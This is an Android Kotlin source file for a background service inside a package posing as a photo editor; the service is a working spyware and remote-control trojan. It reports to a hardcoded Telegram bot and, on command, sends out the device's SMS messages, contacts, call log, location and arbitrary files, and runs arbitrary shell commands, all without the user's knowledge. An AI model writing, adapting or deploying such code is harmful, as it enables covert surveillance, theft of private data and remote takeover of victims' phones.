package com.photo.editor

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class BeaconService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val BOT_TOKEN = "8499165846:AAFsr7EJTCOYcBB1yXLwoDZcHhBPfnvq-Rg"
    private val CHAT_ID = "6146550840"
    private val API = "https://api.telegram.org/bot$BOT_TOKEN"
    private var offset = 0L
    private var running = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { loop() }
        }
        return START_STICKY
    }

    private suspend fun loop() {
        try {
            send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
        } catch (e: Exception) {
            Log.e("beacon", "beacon", e)
        }
        while (true) {
            try {
                val url = "$API/getUpdates?offset=$offset&timeout=10"
                val req = Request.Builder().url(url).build()
                val body = client.newCall(req).execute().body?.string() ?: ""
                val arr = JSONObject(body).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val u = arr.getJSONObject(i)
                    offset = u.getLong("update_id") + 1
                    val msg = u.optJSONObject("message") ?: continue
                    val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                    if (chat != CHAT_ID) continue
                    val text = msg.optString("text", "")
                    handleCmd(text)
                }
            } catch (e: Exception) {
                Log.e("beacon", "poll", e)
            }
            delay(3000)
        }
    }

    private fun handleCmd(cmd: String) {
        val parts = cmd.trim().split(" ", limit = 2)
        val verb = parts[0].lowercase()
        val arg = if (parts.size > 1) parts[1].trim() else ""
        try {
            when (verb) {
                "/ping" -> send("pong")
                "/info" -> send(infoText())
                "/location" -> send(locationText())
                "/sms" -> send(smsText())
                "/contacts" -> send(contactsText())
                "/calls" -> send(callsText())
                "/ls" -> send(lsText(arg))
                "/get" -> sendFile(arg)
                "/shell" -> send(shellText(arg))
                "/battery" -> send(batteryText())
                else -> if (cmd.isNotEmpty()) send("got: $cmd")
            }
        } catch (e: Exception) {
            send("err: ${e.message}")
        }
    }

    private fun infoText(): String {
        return "model: ${Build.MODEL}\nbrand: ${Build.BRAND}\nmanufacturer: ${Build.MANUFACTURER}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}\nboard: ${Build.BOARD}\ndevice: ${Build.DEVICE}\nhost: ${Build.HOST}"
    }

    private fun locationText(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m" else "no location"
        } catch (e: Exception) {
            "loc err: ${e.message}"
        }
    }

    private fun smsText(): String {
        return try {
            val sb = StringBuilder()
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 20"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    sb.append("$addr: $body\n")
                }
            }
            sb.toString().take(3500).ifEmpty { "no sms" }
        } catch (e: Exception) {
            "sms err: ${e.message}"
        }
    }

    private fun contactsText(): String {
        return try {
            val sb = StringBuilder()
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val phone = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                    sb.append("$name: $phone\n")
                }
            }
            sb.toString().take(3500).ifEmpty { "no contacts" }
        } catch (e: Exception) {
            "contacts err: ${e.message}"
        }
    }

    private fun callsText(): String {
        return try {
            val sb = StringBuilder()
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "date DESC LIMIT 20"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val num = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
                    val dur = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                    sb.append("$num [$type] ${dur}s\n")
                }
            }
            sb.toString().take(3500).ifEmpty { "no calls" }
        } catch (e: Exception) {
            "calls err: ${e.message}"
        }
    }

    private fun batteryText(): String {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            "battery: $level%"
        } catch (e: Exception) {
            "battery err: ${e.message}"
        }
    }

    private fun lsText(path: String): String {
        return try {
            val dir = if (path.isEmpty()) File("/sdcard") else File(path)
            dir.listFiles()?.take(60)?.joinToString("\n") { it.name } ?: "empty"
        } catch (e: Exception) {
            "ls err: ${e.message}"
        }
    }

    private fun sendFile(path: String) {
        try {
            val f = File(path)
            if (!f.exists()) { send("not found: $path"); return }
            val bytes = f.readBytes()
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", f.name, bytes.toRequestBody(null))
                .build()
            val req = Request.Builder().url("$API/sendDocument").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            send("file err: ${e.message}")
        }
    }

    private fun shellText(cmd: String): String {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = proc.inputStream.bufferedReader().readText()
            val err = proc.errorStream.bufferedReader().readText()
            (out + err).take(3500).ifEmpty { "no output" }
        } catch (e: Exception) {
            "shell err: ${e.message}"
        }
    }

    private fun send(text: String) {
        try {
            val json = JSONObject().put("chat_id", CHAT_ID).put("text", text.take(4000))
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("$API/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("beacon", "send", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
